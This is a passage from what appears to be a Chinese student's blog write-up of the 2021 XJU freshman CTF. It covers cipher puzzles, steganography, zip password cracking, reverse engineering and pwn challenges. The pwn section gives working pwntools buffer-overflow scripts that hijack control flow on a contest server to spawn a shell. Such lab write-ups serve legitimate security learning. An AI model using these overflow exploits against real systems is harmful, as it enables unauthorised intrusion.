<h3 id="4-小羊跳栅栏"><a href="#4-小羊跳栅栏" class="headerlink" title="4.小羊跳栅栏"></a>4.小羊跳栅栏</h3><p>题目密文为:<code>XXJJUUSCETCF&#123;_WhEaLVCe0_MgEo_0TdO__T1i0m2e4&#125;</code>,根据题目提示猜测为栅栏密码, 用工具枚举到22得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025154922737.png"
                      alt="image-20211025154922737"
                ></p>
<h3 id="5-d-￣▽￣-b"><a href="#5-d-￣▽￣-b" class="headerlink" title="5.d=(￣▽￣*)b"></a>5.d=(￣▽￣*)b</h3><p>下载附件,得到一个名为txt的文件.用notepad++打开的:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025155246508.png"
                      alt="image-20211025155246508"
                ><br> 发现是一堆符号组成的表情,我先到网上搜索表情密码,但是没有获得有效信息,后来不断搜索得知这种东西叫颜文字(知道这东西但用的不多,一时半会没想起来),于是又在网上搜了颜文字密码(aaencode),解密得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025155813049.png"
                      alt="image-20211025155813049"
                ></p>
<h3 id="6-ROT全家桶"><a href="#6-ROT全家桶" class="headerlink" title="6.ROT全家桶"></a>6.ROT全家桶</h3><p>题目给出<code>z(wu#!LH9780h07eK4JC047;BN</code>这一串密文,根据题目提示,应该是ROT系列加密,而且不止一种,于是用工具进行解密: 首先我用ROT47解密得到<code>KWHFRP&#123;whfg_9_f6zcyr_cfjq&#125;</code>,以为接下来是凯撒密码,于是我拿去枚举,得到:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025160418568.png"
                      alt="image-20211025160418568"
                ><br> 将其填入flag,提示错误(黑人问号脸???), 然后仔细看了看我得到的这个flag,发现不能连成一句话,又想想题目,觉得应该不止一次ROT加密,于是又把上一步得到的字符串拿去ROT解密,接下来用ROT18解密试试:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025160737367.png"
                      alt="image-20211025160737367"
                ><br> 得到应该神似flag的字符串,拿去试试,成功</p>
<h3 id="7-我emo了"><a href="#7-我emo了" class="headerlink" title="7.我emo了"></a>7.我emo了</h3><p>下载附件得emo.txt, 里面内容为<code>👏👁👌👊🐼🐺👲👜👤👦👖👦👥👣👰👖👫👟👩👜👜👖👛👜👚👦👛👠👥👞👖👤👜👫👟👦👛👪👴</code>,根据题目和文件名提示,猜测是一个与emoji有关的密码,去网上搜索,得到相关解密网站,解密得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161103301.png"
                      alt="image-20211025161103301"
                ></p>
<h3 id="8-calendar"><a href="#8-calendar" class="headerlink" title="8.calendar"></a>8.calendar</h3><p>下载附件得到一串字符串 <code>S21 F1 T12 T11 T22 M1 F1 M3</code>,根据题目提示,在网上搜索日历密码,发现以下解密方法:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161803100.png"
                      alt="image-20211025161803100"
                ><br> 于是根据题中所给hint手动解密(失败好几次)得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161849524.png"
                      alt="image-20211025161849524"
                ></p>
<h3 id="9-给我的宝剑附个魔"><a href="#9-给我的宝剑附个魔" class="headerlink" title="9.给我的宝剑附个魔"></a>9.给我的宝剑附个魔</h3><p>下载附件解压为一张图片:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025161958159.png"
                      alt="image-20211025161958159"
                ><br> 开始想的是图片隐写(中间写图片隐写写迷了),好久后才发现这是道密码题,在网上搜索跟我的世界附魔方面有关的密码发现有个叫”标准银河字母”的东西:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025162329783.png"
                      alt="image-20211025162329783"
                ><br> 然后对照得到3串字符串,刚开始不知道哪一部分是flag,交了好几个也都错了,想了一会决定拿最后一句赌一把,最后一串大致为<code>flag is standard galaxy word</code>,于是拿<code>standard galaxy word</code>转大写包上XJUSEC{}交了,成功.</p>
<hr>
<h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><hr>
<h3 id="1-你是为网络安全而生的"><a href="#1-你是为网络安全而生的" class="headerlink" title="1.你是为网络安全而生的"></a>1.你是为网络安全而生的</h3><p>关注公众号即可得到flag</p>
<h3 id="2-眼见为虚"><a href="#2-眼见为虚" class="headerlink" title="2.眼见为虚"></a>2.眼见为虚</h3><p>下载附件得到一个压缩包,解压,又得到一个压缩包,再解压,得到一个flag.txt,打开即可得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025203118107.png"
                      alt="image-20211025203118107"
                ></p>
<h3 id="3-签退"><a href="#3-签退" class="headerlink" title="3.签退"></a>3.签退</h3><p>打开题目所给网址填完问卷即可得到flag</p>
<h3 id="4-谁会拒绝嘉然呢？"><a href="#4-谁会拒绝嘉然呢？" class="headerlink" title="4.谁会拒绝嘉然呢？"></a>4.谁会拒绝嘉然呢？</h3><p>下载文件名为zip的附件,根据文件名猜测是个zip压缩包,解压得到”谁会拒绝嘉然呢”文件夹:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025203540591.png"
                      alt="image-20211025203540591"
                ><br> 运行exe文件发现是个拼图游戏,根据题目以及里面图片的提示决定直接拼,将图片一张一张往word里拖慢慢拼,最后可以得到flag(当时没有保存实在是不想再拼一遍了)</p>
<h3 id="5-你画我猜"><a href="#5-你画我猜" class="headerlink" title="5.你画我猜"></a>5.你画我猜</h3><p>下载文件解压,得到一个mrf结尾的文件,经过反复搜索确认(搜了好久),确定是个记录鼠标轨迹的文件,可以用相应的软件(下了好多软件,最终确认是MouseRecorder)打开复现鼠标轨迹:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025204022521.png"
                      alt="image-20211025204022521"
                ><br> 准备打开画图复现轨迹,但是软件总是报错,最后将Window change这一项删掉后就可以正常复现了<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225922662.png"
                      alt="image-20211025225922662"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025204600748.png"
                      alt="image-20211025204600748"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025204451999.png"
                      alt="image-20211025204451999"
                ></p>
<h3 id="6-你究竟会不会看图片啊？"><a href="#6-你究竟会不会看图片啊？" class="headerlink" title="6.你究竟会不会看图片啊？"></a>6.你究竟会不会看图片啊？</h3><p>下载题目附件解压得到一个有密码的压缩包和一个二维码:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025205053058.png"
                      alt="image-20211025205053058"
                ><br> 扫描二维码得到一句”Do you know when Shanny’s birthday is”,得到关键信息-解压密码有可能是一个生日. 于是用c语言写了一个字典:</p>
 <div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"> <span class="meta">#<span class="keyword">include</span><span class="string">&lt;cstdio&gt;</span> </span></span><br><span class="line"> <span class="keyword">using</span> <span class="keyword">namespace</span> std; </span><br><span class="line"> <span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123; </span><br><span class="line">  <span class="built_in">freopen</span>(<span class="string">&quot;bar.txt&quot;</span>,<span class="string">&quot;w&quot;</span>,stdout); </span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">01</span>;j&lt;=<span class="number">12</span>;j++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> k=<span class="number">1</span>;k&lt;=<span class="number">31</span>;k++)&#123; </span><br><span class="line">      <span class="keyword">if</span>(j/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;j&lt;&lt;<span class="string">&quot;&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span>(k/<span class="number">10</span>==<span class="number">0</span>) cout&lt;&lt;<span class="number">0</span>; cout&lt;&lt;k&lt;&lt;endl; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025230317616.png"
                      alt="image-20211025230317616"
                ><br> 然后用github上的zipcrack跑密码,得到密码为0308:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025230549981.png"
                      alt="image-20211025230549981"
                ><br> 输入密码解压得到两张图片猜测是图片隐写 用01editor打开,在第一张图片里发现<code>XJUSEC&#123;Y0u_h2ve_a1r2ady_XJUSEC&#123;w0w j1ng rucb5439345d8b014396&#125;</code><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025205858897.png"
                      alt="image-20211025205858897"
                ><br> 第二张里发现flag:<code>a1r2ady_sta1ted&#125;</code>:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025205956732.png"
                      alt="image-20211025205956732"
                ><br> 拼接得到flag: <code>XJUSEC&#123;Y0u_h2ve_a1r2ady_sta1ted&#125;</code></p>
<h3 id="7-暗藏玄机的excel"><a href="#7-暗藏玄机的excel" class="headerlink" title="7.暗藏玄机的excel"></a>7.暗藏玄机的excel</h3><p>下载附件flag.xlsx,打开查看里面内容,发现几条重要信息:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211438283.png"
                      alt="image-20211025211438283"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211507228.png"
                      alt="image-20211025211507228"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211614649.png"
                      alt="image-20211025211614649"
                ><br> 根据最后一个提示,我用01editor打开这个文件发现文件头为<code>50 4B 03 04</code>判断是个zip压缩包:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211756918.png"
                      alt="image-20211025211756918"
                ><br> 解压得:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025211958198.png"
                      alt="image-20211025211958198"
                ><br> 里面有很多文件,找了一会后发现几个信息:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025212701885.png"
                      alt="image-20211025212701885"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025212346719.png"
                      alt="image-20211025212346719"
                ><br> 后来觉得开始excel里给的几个提示也许有用,一个是”表一少了什么,有什么东西看不见”,一个是”你不觉得表一中的嘉然很可爱吗”,觉得可能flag藏在这两个地方相关的文件里,于是notepad++打开几个相关的文件,发现了一些信息,如图:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213252838.png"
                      alt="image-20211025213252838"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213302291.png"
                      alt="image-20211025213302291"
                ><br> 从这两个信息判断出这个图片一个隐藏了一个加密的zip的压缩包,把图片送进01editor搜索zip文件头<code>50 4B 03 04</code>文件头,发现:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213500288.png"
                      alt="image-20211025213500288"
                ><br> 文件尾刚好也是<code>00 00 00 00</code>,确定是个zip压缩包,将<code>50 4B 03 04</code>及以下16进制代码另存为一个fffflag.zip:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213719297.png"
                      alt="image-20211025213719297"
                ><br> 解压,密码在上面已获得,得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213848528.png"
                      alt="image-20211025213848528"
                ></p>
<hr>
<h2 id="Osint"><a href="#Osint" class="headerlink" title="Osint"></a>Osint</h2><hr>
<h3 id="1-找找flag"><a href="#1-找找flag" class="headerlink" title="1.找找flag?"></a>1.找找flag?</h3><p>根据题目提示访问Github搜索Ethe448,发现有一个hexo博客的项目,仔细看了看发现有个Secret(题目中的”小秘密”),打开得到两张图片:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025213925365.png"
                      alt="image-20211025213925365"
                ><br> 拼接二维码扫描得flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025214136400.png"
                      alt="image-20211025214136400"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025214232394.png"
                      alt="image-20211025214232394"
                ></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>2021</tag>
        <tag>Crypto</tag>
        <tag>CTF</tag>
        <tag>Misc</tag>
        <tag>Osint</tag>
        <tag>Pwn</tag>
        <tag>Reverse</tag>
        <tag>Web</tag>
        <tag>XJUSEC</tag>
        <tag>XJU新生赛</tag>
        <tag>比赛</tag>
      </tags>
  </entry>
  <entry>
    <title>2021XJU CTF新生赛Writeup</title>
    <url>/2021/10/25/2021xju-ctf%E6%96%B0%E7%94%9F%E8%B5%9Bwriteup/</url>
    <content><![CDATA[<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><hr>
<h3 id="1-Pwn指北"><a href="#1-Pwn指北" class="headerlink" title="1.Pwn指北"></a>1.Pwn指北</h3><p>下载附件直接拉到最下面即可<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025000814837.png"
                      alt="image-20211025000814837"
                ></p>
<h3 id="2-test-your-nc"><a href="#2-test-your-nc" class="headerlink" title="2.test your nc"></a>2.test your nc</h3><p>直接运行题目所给命令即可夺权-<strong>nc 116.62.221.105 10001</strong><br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025001335768.png"
                      alt="image-20211025001335768"
                ></p>
<h3 id="3-RIP"><a href="#3-RIP" class="headerlink" title="3.RIP"></a>3.RIP</h3><p>下载附件rip,首先判断是多少位的程序:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025214737923.png"
                      alt="image-20211025214737923"
                ><br> 64位,放到IDA64中打开分析,找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025215043784.png"
                      alt="image-20211025215043784"
                ></p>
<hr>
<p>程序定义了一个长32的s字符串用以获取用户输入,但是gets()函数无法判断用户输入了多少个字符,发现溢出点. 接下来找用以夺权的函数,在fun中发现了bin&#x2F;sh:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025215426081.png"
                      alt="image-20211025215426081"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025221821849.png"
                      alt="image-20211025221821849"
                ><br> 转到汇编视图,发现程序在数据段中定义了command字符串,内容为”bin&#x2F;sh”,然后再0x4005BF这个地址将command放到了rdi寄存器中, 然后在后面调用了_system函数(call指令),因此溢出操作后写入0x4005BF这个地址就可以夺权了(以上为我的理解,不是很透彻也可能会有错误) 因此构建以下脚本:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10002</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">32</span>+<span class="number">8</span>)+p64(<span class="number">0x4005BF</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>

<p>执行脚本成功拿到flag<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025221711345.png"
                      alt="image-20211025221711345"
                ></p>
<h3 id="4-level0"><a href="#4-level0" class="headerlink" title="4.level0"></a>4.level0</h3><p>下载附件检查信息,是个64位程序<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025222745285.png"
                      alt="image-20211025222745285"
                ><br> 拖到IDA64中分析找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025223107306.png"
                      alt="image-20211025223107306"
                ><br> 双击进入函数:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025223210470.png"
                      alt="image-20211025223210470"
                ><br> 发现buf长度为128,read()函数允许我们输入0x200个长度的数据,比128大,可以进行溢出操作,然后找夺权函数:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025223934774.png"
                      alt="image-20211025223934774"
                ><br> 分析同上题一样,构建脚本:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10003</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">128</span>+<span class="number">8</span>)+p64(<span class="number">0x4011AA</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224140038.png"
                      alt="image-20211025224140038"
                ><br> 得到flag</p>
<h3 id="5-Guess-number"><a href="#5-Guess-number" class="headerlink" title="5.Guess number"></a>5.Guess number</h3><p>下载附件,分析为64位<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224340577.png"
                      alt="image-20211025224340577"
                ><br> 拖到IDA64,分析:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224510616.png"
                      alt="image-20211025224510616"
                ><br> 双击打开func():<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224601703.png"
                      alt="image-20211025224601703"
                ><br> 发现只要有一个长度为56的v1字符串和一个浮点数v2,而且当v2&#x3D;11.28125,就可以拿到flag,但是发现我们输入的是v1,无法输入v2,继续分析:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025224816420.png"
                      alt="image-20211025224816420"
                ><br> 发现v1字符串的地址在-0x40,v2浮点数在-0x08的位置,我们可以将-0x40到-0x08全填满然后将11.28215赋给v2. 这里我们还需要将11.28215转换为16进制:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225507436.png"
                      alt="image-20211025225507436"
                ><br> 在汇编视图,ucomiss比较指令后双击进入后面的数据可以找到11.28215的16进制表示:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225745186.png"
                      alt="image-20211025225745186"
                ><br> 构造以下python脚本:</p>
<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r=remote(<span class="string">&quot;116.62.221.105&quot;</span>,<span class="number">10004</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x40</span>-<span class="number">0x8</span>)+p64(<span class="number">0x41348000</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025225834268.png"
                      alt="image-20211025225834268"
                ></p>
<hr>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><hr>
<h3 id="1-re签到"><a href="#1-re签到" class="headerlink" title="1.re签到"></a>1.re签到</h3><p>下载文件后解压得到<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025002846509.png"
                      alt="image-20211025002846509"
                ><br> 然后将其拖入到IDA中并且根据提示按Shift+F12得到如下视图,然后可在其中找到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003021216.png"
                      alt="image-20211025003021216"
                ></p>
<h3 id="2-game-switch"><a href="#2-game-switch" class="headerlink" title="2.game switch"></a>2.game switch</h3><p>下载附件得到<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003204918.png"
                      alt="image-20211025003204918"
                ><br> 先直接运行<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003241691.png"
                      alt="image-20211025003241691"
                ><br> 让输入0-8其中一个数(0为重启游戏),数据量不大直接先从1试到8,试到8时出现flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003453306.png"
                      alt="image-20211025003453306"
                ></p>
<h3 id="3-再用IDA签一次到"><a href="#3-再用IDA签一次到" class="headerlink" title="3.再用IDA签一次到"></a>3.再用IDA签一次到</h3><p>下载得到2.exe文件,直接拖入IDA分析,找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025003726712.png"
                      alt="image-20211025003726712"
                ><br> 双击进入check_flag()函数,得到如下代码:</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line">int64 __fastcall <span class="title function_">check_flag</span><span class="params">(<span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *a1 != <span class="number">120</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">1</span>];</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">106</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">117</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">3</span>];</span><br><span class="line">      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">123</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">4</span>];</span><br><span class="line">        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">66</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">5</span>];</span><br><span class="line">          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">105</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">6</span>];</span><br><span class="line">            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">7</span>];</span><br><span class="line">              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">8</span>];</span><br><span class="line">                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">114</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">9</span>];</span><br><span class="line">                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">121</span> )</span><br><span class="line">                  &#123;</span><br><span class="line">                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">10</span>];</span><br><span class="line">                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">11</span>];</span><br><span class="line">                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">83</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        result = (<span class="type">unsigned</span> __int8)a1[<span class="number">12</span>];</span><br><span class="line">                        <span class="keyword">if</span> ( (_BYTE)result == <span class="number">116</span> )</span><br><span class="line">                        &#123;</span><br><span class="line">                          result = (<span class="type">unsigned</span> __int8)a1[<span class="number">13</span>];</span><br><span class="line">                          <span class="keyword">if</span> ( (_BYTE)result == <span class="number">97</span> )</span><br><span class="line">                          &#123;</span><br><span class="line">                            result = (<span class="type">unsigned</span> __int8)a1[<span class="number">14</span>];</span><br><span class="line">                            <span class="keyword">if</span> ( (_BYTE)result == <span class="number">110</span> )</span><br><span class="line">                            &#123;</span><br><span class="line">                              result = (<span class="type">unsigned</span> __int8)a1[<span class="number">15</span>];</span><br><span class="line">                              <span class="keyword">if</span> ( (_BYTE)result == <span class="number">100</span> )</span><br><span class="line">                              &#123;</span><br><span class="line">                                result = (<span class="type">unsigned</span> __int8)a1[<span class="number">16</span>];</span><br><span class="line">                                <span class="keyword">if</span> ( (_BYTE)result == <span class="number">95</span> )</span><br><span class="line">                                &#123;</span><br><span class="line">                                  result = (<span class="type">unsigned</span> __int8)a1[<span class="number">17</span>];</span><br><span class="line">                                  <span class="keyword">if</span> ( (_BYTE)result == <span class="number">85</span> )</span><br><span class="line">                                  &#123;</span><br><span class="line">                                    result = (<span class="type">unsigned</span> __int8)a1[<span class="number">18</span>];</span><br><span class="line">                                    <span class="keyword">if</span> ( (_BYTE)result == <span class="number">112</span> )</span><br><span class="line">                                    &#123;</span><br><span class="line">                                      result = (<span class="type">unsigned</span> __int8)a1[<span class="number">19</span>];</span><br><span class="line">                                      <span class="keyword">if</span> ( (_BYTE)result == <span class="number">125</span> )</span><br><span class="line">                                      &#123;</span><br><span class="line">                                        <span class="built_in">printf</span>(<span class="string">&quot;yes,this is a flag&quot;</span>);</span><br><span class="line">                                        getchar();</span><br><span class="line">                                        result = <span class="number">0</span>i64;</span><br><span class="line">                                      &#125;</span><br><span class="line">                                    &#125;</span><br><span class="line">                                  &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                              &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                          &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                  &#125;</span><br><span class="line">                &#125;</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></div>

<p>经过分析可得程序将输入的v2字符串传到check_flag()函数的a1中,然后将a1[1]-a1[19]中的字符与一个ASCII码进行对比,若全部相等则输出yes,this is a flag. 因此判断将所有ASCII码转为字符连起来即可得到flag,实际中会得到 ju{xxxxxx},根据flag格式前面应该缺一个 x ,补上即为正确flag</p>
<h3 id="4-Nizdy不喜欢玩游戏"><a href="#4-Nizdy不喜欢玩游戏" class="headerlink" title="4.Nizdy不喜欢玩游戏"></a>4.Nizdy不喜欢玩游戏</h3><p>下载文件FlappyflappyBird.exe,拖入IDA分析,找到main函数,F5反编译:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025004946233.png"
                      alt="image-20211025004946233"
                ><br> 题目说是玩到2021分就有flag,发现当score&gt;2020时会输出real[0]和src,双击这俩变量进入汇编视图查看变量内容,如图:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025005217219.png"
                      alt="image-20211025005217219"
                ><br> 可以很快发现src的内容与flag形式很像,猜测为凯撒密码,将其复制到凯撒密码解密器中枚举,得到flag:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025005433577.png"
                      alt="image-20211025005433577"
                ></p>
<h3 id="5-easyre"><a href="#5-easyre" class="headerlink" title="5.easyre"></a>5.easyre</h3><p>下载解压得到easyre.txt,打开发现是c语言,简单分析一下:<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://image.txgde.space/2021/10/image-20211025005923226.png"
                      alt="image-20211025005923226"
